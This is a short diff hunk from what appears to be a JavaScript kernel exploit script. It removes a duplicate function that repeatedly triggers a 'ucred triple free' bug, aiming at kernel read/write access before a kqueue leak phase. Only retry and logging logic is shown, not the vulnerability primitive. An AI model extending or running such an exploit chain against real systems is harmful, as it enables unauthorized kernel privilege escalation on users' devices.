@@ -1078,21 +1078,6 @@ function exploit_phase_trigger() {
   log('Leaking...');
   yield_to_render(exploit_phase_leak);
 }
-function exploit_phase_trigger() {
-  if (exploit_count >= MAIN_LOOP_ITERATIONS) {
-    log('Failed to acquire kernel R/W');
-    cleanup();
-    return;
-  }
-  exploit_count++;
-  log('Triggering vulnerability (' + exploit_count + '/' + MAIN_LOOP_ITERATIONS + ')...');
-  if (!trigger_ucred_triplefree()) {
-    yield_to_render(exploit_phase_trigger);
-    return;
-  }
-  log('Leaking kqueue...');
-  yield_to_render(exploit_phase_leak);
-}
 function exploit_phase_leak() {
   if (exploit_end) return;
 
